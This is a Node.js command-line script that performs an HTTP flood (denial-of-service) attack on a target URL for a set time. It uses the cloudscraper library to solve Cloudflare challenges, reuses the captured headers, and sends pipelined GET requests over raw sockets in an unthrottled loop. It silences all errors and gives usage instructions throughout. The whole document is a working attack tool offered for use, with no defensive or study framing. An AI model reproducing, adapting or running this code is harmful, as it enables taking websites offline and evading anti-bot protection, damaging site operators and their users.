require('events').EventEmitter.defaultMaxListeners = 0;
const CloudScraper = require('cloudscraper'),
    path = require('path'),
    url = require('url');

if (process.argv.length !== 5) {
    console.log(`
Usage: node ${path.basename(__filename)} <url> <time> <req_per_ip>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <150>`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4],
    host = url.parse(target).host;

let getHeaders = new Promise(function (resolve, reject) {
    CloudScraper.get({
        uri: target,
        resolveWithFullResponse: true,
        challengesToSolve: 10
    }, function (error, response) {
        if (error) {
            return console.log(error.message);
        }
        let headers = '';
        Object.keys(response.request.headers).forEach(function (i, e) {
            headers += i + ': ' + response.request.headers[i] + '\r\n';
        });

        console.log(headers);
        resolve(headers);
    });
});

function send_req(headers) {
    const net = require('net'),
        client = new net.Socket();

    client.connect(80, host);
    client.setTimeout(10000);

    for (let i = 0; i < req_per_ip; ++i) {
        client.write(
            `GET ${target} HTTP/1.1\r\n` +
            headers + '\r\n\r\n'
        )
    }

    client.on('data', function () {
        setTimeout(function () {
            client.destroy();
            return delete client;
        }, 5000);
    });
}

getHeaders.then(function (result) {
    console.log('Attack started !');
    setInterval(() => {
        send_req(result);
    });
});

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

// to avoid errors
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
